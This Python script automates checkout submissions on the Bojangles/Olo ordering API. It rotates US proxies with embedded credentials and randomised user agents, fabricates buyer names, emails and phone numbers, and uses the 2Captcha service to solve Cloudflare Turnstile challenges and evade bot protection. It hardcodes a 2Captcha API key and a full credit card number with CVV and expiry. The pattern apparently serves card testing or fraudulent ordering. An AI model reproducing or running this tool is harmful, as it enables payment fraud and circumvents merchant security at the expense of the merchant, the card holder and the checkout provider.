import requests
import random
import time
from twocaptcha import TwoCaptcha

# --- 2Captcha API Configuration ---
TWOCAPTCHA_API_KEY = "7d650d03fc276e39a6e0ad35ff544377"

# --- VALIDATED USA PROXIES ONLY (7 Working Proxies) ---
usa_proxy_list = [
    "iicwyzxj:43fcbrangis0@142.111.48.253:7030",  # Los Angeles, California
    "iicwyzxj:43fcbrangis0@23.95.150.145:6114",   # Buffalo, New York
    "iicwyzxj:43fcbrangis0@198.23.239.134:6540",  # Buffalo, New York
    "iicwyzxj:43fcbrangis0@107.172.163.27:6543",  # Buffalo, New York
    "iicwyzxj:43fcbrangis0@216.10.27.159:6837",   # Los Angeles, California
    "iicwyzxj:43fcbrangis0@23.26.71.145:5628",    # Orem, Utah
    "iicwyzxj:43fcbrangis0@23.27.208.120:5830",   # Reston, Virginia
]

# --- List of User-Agents to rotate ---
user_agent_list = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
]

# --- Pre-defined lists for rotating user data ---
first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
email_domains = ["@gmail.com", "@yahoo.com", "@outlook.com", "@hotmail.com"]

def get_random_phone_number():
    """Generates a random US-formatted phone number."""
    return f"{random.randint(201, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}"

def solve_cloudflare_challenge(url, proxy_string):
    """
    Solve Cloudflare challenge using 2Captcha Turnstile service
    """
    try:
        print(f"[*] Attempting to solve Cloudflare challenge for: {url}")
        
        solver = TwoCaptcha(TWOCAPTCHA_API_KEY)
        
        # Parse proxy for 2Captcha format
        proxy_parts = proxy_string.split('@')
        auth = proxy_parts[0]  # username:password
        host_port = proxy_parts[1]  # host:port
        username, password = auth.split(':')
        host, port = host_port.split(':')
        
        proxy_config = {
            'type': 'HTTP',
            'address': host,
            'port': int(port),
            'login': username,
            'password': password
        }
        
        # Cloudflare Turnstile solving
        # Note: We need the sitekey from the Cloudflare challenge page
        # For now, we'll try to get the page first to extract the sitekey
        
        print("[*] Fetching Cloudflare challenge page to extract sitekey...")
        proxies = {"http": f"http://{proxy_string}", "https": f"http://{proxy_string}"}
        
        response = requests.get(url, proxies=proxies, timeout=15)
        
        # Check if Cloudflare challenge is present
        if 'cf-chl-bypass' in response.text or 'cf_clearance' in response.cookies:
            print("[+] No Cloudflare challenge detected or already bypassed!")
            return response.cookies
        
        # Try to extract Turnstile sitekey from the page
        import re
        sitekey_match = re.search(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)', response.text)
        
        if sitekey_match:
            sitekey = sitekey_match.group(1)
            print(f"[*] Found Cloudflare Turnstile sitekey: {sitekey}")
            
            # Solve the Turnstile challenge
            print("[*] Sending challenge to 2Captcha... (this may take 30-60 seconds)")
            result = solver.turnstile(
                sitekey=sitekey,
                url=url,
                proxy=proxy_config
            )
            
            cf_clearance_token = result['code']
            print(f"[+] Successfully solved Cloudflare challenge!")
            print(f"[+] cf_clearance token: {cf_clearance_token[:50]}...")
            
            # Return cookies with cf_clearance
            cookies = {'cf_clearance': cf_clearance_token}
            return cookies
        else:
            print("[!] Could not find Cloudflare Turnstile sitekey in page")
            print("[!] The site might be using a different Cloudflare protection")
            return None
            
    except Exception as e:
        print(f"[!] Error solving Cloudflare challenge: {e}")
        return None

def process_order_with_2captcha():
    """
    Process order using 2Captcha to bypass Cloudflare
    """
    try:
        # Select random proxy and user agent
        proxy_choice = random.choice(usa_proxy_list)
        proxies = {"http": f"http://{proxy_choice}", "https": f"http://{proxy_choice}"}
        user_agent = random.choice(user_agent_list)
        
        print("="*70)
        print("BOJANGLES ORDER AUTOMATION (2CAPTCHA + USA PROXIES)")
        print("="*70)
        print(f"[*] Using USA Proxy: {proxy_choice.split('@')[1]}")
        print(f"[*] Using User-Agent: {user_agent}")
        
        # Generate random user data
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10,99)}{random.choice(email_domains)}"
        phone_number = get_random_phone_number()
        
        print(f"\n[*] Using Rotated User Data:")
        print(f"    - Name: {first_name} {last_name}")
        print(f"    - Email: {email}")
        print(f"    - Phone: {phone_number}")
        
        # Step 1: Get access token
        order_id = "def67214-7132-4e25-a8ea-7a18923f734f"
        token_url = f'https://www.bojangles.com/api/v1/orders/{order_id}/token'
        
        print(f"\n[*] Fetching access token...")
        
        token_headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-GB',
            'user-agent': user_agent,
            'origin': 'https://www.bojangles.com',
        }
        
        token_response = requests.post(token_url, headers=token_headers, proxies=proxies, timeout=20)
        token_response.raise_for_status()
        
        access_token = token_response.json().get('accesstoken')
        if not access_token:
            print("[!] Failed to retrieve access token")
            return
        
        print(f"[+] Successfully retrieved Access Token: {access_token}")
        
        # Step 2: Solve Cloudflare challenge for olocheckout.com
        submit_url = f'https://www.olocheckout.com/api/baskets/{order_id}/submit'
        
        print(f"\n[*] Checking Cloudflare protection on olocheckout.com...")
        cf_cookies = solve_cloudflare_challenge('https://www.olocheckout.com', proxy_choice)
        
        # Step 3: Submit order with Cloudflare bypass
        print(f"\n[*] Submitting order...")
        
        checkout_headers = {
            'accept': '*/*',
            'accept-language': 'en-GB',
            'content-type': 'application/json',
            'origin': 'https://www.olocheckout.com',
            'referer': f'https://www.olocheckout.com/checkout?brandAccessId=pOsOaQRlbWrRjoMlO82GyeaaXhVRBNwn&BasketGuid={order_id}',
            'user-agent': user_agent,
            'x-olo-domain-origin': 'https://www.bojangles.com',
            'x-olo-request': '1',
        }
        
        json_data = {
            'brandAccessId': 'pOsOaQRlbWrRjoMlO82GyeaaXhVRBNwn',
            'accessToken': access_token,
            'firstName': first_name,
            'lastName': last_name,
            'emailAddress': email,
            'contactNumber': phone_number,
            'customData': [],
            'billingAccounts': [{
                'billingFields': [],
                'billingMethod': 'creditcard',
                'expiryYear': '2028',
                'expiryMonth': '10',
                'zip': '10080',
                'saveOnFile': False,
                'amount': 11.49,
                'tipPortion': 0,
                'cardNumber': '4677845104934858',
                'cvv': '548',
            }],
            'bookingUserOptIntoSms': False,
            'createOloAccount': False,
        }
        
        # Create session with cookies if we have them
        session = requests.Session()
        if cf_cookies:
            session.cookies.update(cf_cookies)
        
        submit_response = session.post(
            submit_url,
            headers=checkout_headers,
            json=json_data,
            proxies=proxies,
            timeout=30
        )
        
        # Display results
        print("\n" + "="*70)
        print("FINAL RESPONSE")
        print("="*70)
        print(f"Status Code: {submit_response.status_code}")
        print(f"\nResponse Body:")
        print(submit_response.text)
        
        if submit_response.status_code == 200:
            print("\n[+] SUCCESS! Order submitted successfully!")
        elif submit_response.status_code == 403:
            if 'cloudflare' in submit_response.text.lower():
                print("\n[-] Still blocked by Cloudflare")
                print("[!] The Cloudflare challenge might have changed or requires manual solving")
            else:
                print("\n[-] Request forbidden (403)")
        else:
            print(f"\n[!] Unexpected status code: {submit_response.status_code}")
        
        print("="*70)
        
    except requests.exceptions.ProxyError as e:
        print(f"\n[!] Proxy Error: {proxy_choice.split('@')[1]} failed")
        print(f"    Details: {e}")
    except requests.exceptions.Timeout:
        print(f"\n[!] Request Timed Out")
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    process_order_with_2captcha()
